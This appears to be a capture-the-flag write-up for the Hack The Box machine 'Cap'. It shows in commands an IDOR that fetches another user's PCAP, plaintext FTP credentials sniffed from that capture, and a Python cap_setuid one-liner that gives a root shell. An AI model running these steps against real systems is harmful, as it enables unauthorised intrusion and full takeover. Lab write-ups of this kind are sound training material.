# HTB — Cap 🧢 | Writeup

*this box really said "catch these creds" and I absolutely caught them.*

| | |
|---|---|
| **Machine** | Cap |
| **OS** | Linux (Ubuntu 20.04) |
| **Difficulty** | Easy |
| **IP** | 10.129.50.142 |
| **Vibes** | IDOR → sniffed creds → Linux capabilities privesc |

---

## 1. Recon — gotta scope the target first

No cap, first move on literally every box is the rustscan. Let's see what we're working with:

```bash
rustscan -a 10.129.50.142 --ulimit 5000 -- -sC -sV
```

**Open ports (the usual suspects):**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Gunicorn (Python) |

Tried anonymous FTP login first because free stuff is always worth a shot:

```bash
ftp 10.129.50.142
# Name: anonymous → 530 Login incorrect
```

Yeah, no. Locked down. Moving on to the website, that's where the real plot was anyway.

---

## 2. Web Enum — scoping the "Security Dashboard"

```bash
whatweb -v http://10.129.50.142/
```

Site's running a **Flask/Gunicorn app** styled as a "Security Dashboard." Sidebar had some links that were basically begging to be clicked:

- `/` → Dashboard
- `/capture` → **Security Snapshot (5 Second PCAP + Analysis)** ⬅️ this one's giving main character energy
- `/ip` → IP Config
- `/netstat` → Network Status

`/capture` sounds like it's literally recording network traffic and handing you the file. That's a huge "please hack me" sign if I've ever seen one.

---

## 3. The Vuln — IDOR go brrr

```bash
curl -s http://10.129.50.142/capture
```

**Response:**

```
Redirecting... You should be redirected automatically to target URL: /data/1
```

So every new capture gets a **sequential numeric ID** (`/data/1`, `/data/2`...) and it's served straight up via:

```bash
curl -s http://10.129.50.142/download/0 -o 0.pcap
```

This is a classic **IDOR (Insecure Direct Object Reference)** — the app has zero access control on *which* capture ID you're allowed to grab. So naturally, we just... ask for someone else's. Tried `ID = 0` since it's the lowest possible value, probably left over from when the box was first set up — and bingo, free loot.

---

## 4. Cracking Open the PCAP

```bash
tshark -r 0.pcap -Y "ftp"
```

**And there it is:**

```
Request: USER nathan
Response: 331 Please specify the password.
Request: PASS Buck3tH4T****3!
Response: 230 Login successful.
```

FTP ships creds in **plaintext**, so this was basically handed to us on a platter:

```
Username: nathan
Password: Buck3tH4T****3!
```

>  **Sensitive data location:** PCAP ID `0`, protocol = **FTP** (no encryption, rip)

---

## 5. Getting the Foothold

Tested the creds on FTP first since trust issues:

```bash
ftp 10.129.50.142
# nathan / Buck3tH4T****3!
```

Walked away with `user.txt` immediately:

```bash
ftp> get user.txt
```

```bash
cat user.txt
55e10c5deb30c4bbf689a75dd11e******
```

🏁 First flag, easy W. But FTP's mid for actually doing anything, so time for a real shell:
-- **You can get the flag and credentials yourself. I won't tell you.** --

```bash
ssh nathan@10.129.50.142
# Password: Buck3tH4T****3!
```

We're in. Foothold secured as `nathan`.

---

## 6. Privesc — the whole reason this box is named "Cap"

The box's name was literally dropping hints the entire time (capabilities, get it?).

Checked sudo first, just in case we got lucky:

```bash
sudo -l
# Sorry, user nathan may not run sudo on cap.
```

No cap, that capped out fast 💀. Next move — scan for Linux **capabilities** instead of the usual SUID hunt:

```bash
getcap -r / 2>/dev/null
```

**Jackpot:**

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/.../gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`/usr/bin/python3.8` has **`cap_setuid`** set. That means the binary itself can change its own UID — no SUID bit needed, no sudo needed, nothing. It's just... allowed.

### The Exploit

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Python sets its effective UID to `0` (root), then spawns `/bin/bash`, which inherits that root power. Pure crime.

```bash
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

**We're root. Let's gooo.**

```bash
cd /root
cat root.txt
```

---

## 7. TL;DR / Recap

| Step | What happened |
|------|----------------|
| Foothold | IDOR on `/download/<id>` leaked old PCAP captures |
| Creds | Plaintext FTP login sniffed straight from `0.pcap` |
| Privesc | `cap_setuid` on `/usr/bin/python3.8` = instant root |

**Vulnerable binary:**
```
/usr/bin/python3.8
```

### Actual lessons (not just flex material)
- Numeric, guessable object IDs with zero access control = instant IDOR. Always scope access by session/user, not just by ID.
- FTP is ancient and leaks creds in cleartext — SFTP/FTPS or bust.
- `getcap -r /` deserves way more hype in privesc checklists. Everyone's out here checking SUID binaries and sleeping on capabilities.

---

*gg, box down. on to the next one 🚩*
